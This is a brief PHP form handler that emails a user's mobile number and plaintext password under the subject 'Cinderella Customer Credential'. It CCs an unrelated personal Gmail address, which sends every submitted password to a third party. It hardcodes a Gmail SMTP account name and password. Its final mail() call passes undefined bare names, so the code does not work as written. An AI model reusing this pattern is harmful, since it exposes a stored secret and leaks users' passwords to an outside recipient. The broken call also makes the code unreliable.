<?php


    //require_once "mail/Mail.php";
   
    
    $mail = $_POST['mail'];
    $mobile = $_POST['mobile'];
    $pwd = $_POST['pwd'];
    
    $host = "ssl://smtp.gmail.com";
    $username = "kpfbanoreply@gmail.com";
    $password = "kpfba2016";
    $port = "465";
    $email_from = "kingarrest777@gmail.com";
    $email_subject = "Cinderella Customer Credential" ;
    $email_body = "User:".$mobile ." Password:".$pwd  ;
    $email_address = "kpfbanoreply@gmail.com";
    
   /* echo("success");
    $headers = array ('From' => $email_from, 'To' => $mail, 'Subject' => $email_subject, 'Reply-To' => $email_address);
    echo($headers);
    $smtp = Mail::factory('smtp', array ('host' => $host, 'port' => $port, 'auth' => true, 'username' => $username, 'password' => $password));
    echo($smtp);
    $mail = $smtp->send($mail, $headers, $email_body);*/

$to = $mail;
$subject = $email_subject;
$txt = $email_body;
$headers = "From: vijayece102@gmail.com" . "\r\n" .
"CC: dthayalan333@gmail.com";

    mail(to,subject,message,headers,parameters);
    
    
        
    
?>

